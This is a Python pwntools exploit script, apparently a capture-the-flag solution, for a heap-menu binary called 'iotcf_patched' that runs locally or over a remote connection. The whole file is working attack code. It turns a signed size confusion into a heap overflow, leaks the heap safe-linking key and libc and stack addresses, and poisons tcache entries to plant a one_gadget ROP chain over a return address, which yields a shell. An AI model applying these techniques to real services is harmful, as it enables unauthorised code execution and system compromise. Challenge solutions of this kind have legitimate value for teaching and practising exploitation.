#!/usr/bin/env python3

from pwn import *
import struct

exe = context.binary = ELF('./iotcf_patched', checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'debug'
gs = ''''''



def init():
    if args.LOCAL:
        p = process(exe.path)
        gdb.attach(p, gdbscript=gs)
    elif args.REMOTE:
        p = remote(sys.argv[1], int(sys.argv[2]))
    
    return p

def allocate(size, content):
    p.sendlineafter(b'Choice >> ', b"1")
    p.sendlineafter(b'Length >> ', str(size))
    p.sendafter(b"Content >> ", content)

def show(idx):
    p.sendlineafter(b'Choice >> ', b"2")
    p.sendlineafter(b'Index >> ', str(idx))

def free(idx):
    p.sendlineafter(b'Choice >> ', b"3")
    p.sendlineafter(b'Index >> ', str(idx))

def to_sign(value):
    return struct.unpack("<q", struct.pack("<Q", value))[0]

p = init()
value = 0xf000000000010018
signed_value = to_sign(value)
#### leak heap address ####
allocate(0x18, b"A" * 0x17)
payload = flat(
    b"B"*0x18,
)

allocate(signed_value, payload)
allocate(0x18, b"C" * 0x17)
free(2)
show(1)
p.recvuntil(p64(0x21))
xor = u64(p.recv(8))
#### leak libc address ####
value = 0xf000000000000428
signed_value = to_sign(value)
allocate(signed_value, b"D"*(0x428-1))
allocate(0x28, b"E" * 0x27) 
free(2)
show(1)
p.recvuntil(p64(0x431))
libc_leak = u64(p.recv(8))
libc_base = libc_leak - (libc.sym.main_arena+96)
libc_environ = libc_base + libc.sym.environ
xor_rax = libc_base + 0x00000000000baaf9
og = libc_base + 0xebd3f
#### leak environ ###
allocate(0x18, b"F" * 0x17)
log.info(f"xor: {hex(xor)}")
log.info(f"libc_base: {hex(libc_base)}")
log.info(f"libc_environ {hex(libc_environ)}")
# 3
value = 0xf000000000010038
signed_value = to_sign(value)
allocate(0x38, b"G" * 0x37)
allocate(0x18, b"H" * 0x17)
allocate(0x18, b"I" * 0x17)
free(4)
free(6)
free(5)
input()
payload = flat(
    b"G"*0x38,
    p64(0x21),
    p64((libc_environ-0x10)^xor),
)
allocate(signed_value, payload)
allocate(0x18, b"H" * 0x17)
allocate(0x18, b"I" * 0x8)

show(6)
p.recvuntil(b"I"*8 + b"\00"*8)
stack_leak = u64(p.recv(7).ljust(8, b"\00"))    
log.info(f"stack_leak {hex(stack_leak)}")
# allocate(0x38, b"G" * 0x37)
#### rop gadget ####
value = 0xf000000000100048
signed_value = to_sign(value)
rbp = p64(stack_leak)
win = flat(
    p64(stack_leak+0x10),
    p64(xor_rax),
    p64(og),
)
ret_addr = stack_leak - 0x128
allocate(0x48, b"J" * 0x47)
allocate(0x28, b"K" * 0x27)
allocate(0x28, b"L" * 0x27)
free(7)
free(9)
free(8)
log.info(f"ret_addr: {hex(ret_addr)}")
payload = flat(
    b"J" * 0x48,
    p64(0x31),
    p64(ret_addr^xor),
)
allocate(signed_value, payload) 
allocate(0x28, b"K" * 0x27)
allocate(0x28, win)
input()
p.sendlineafter(b'Choice >> ', b"4")

p.interactive()
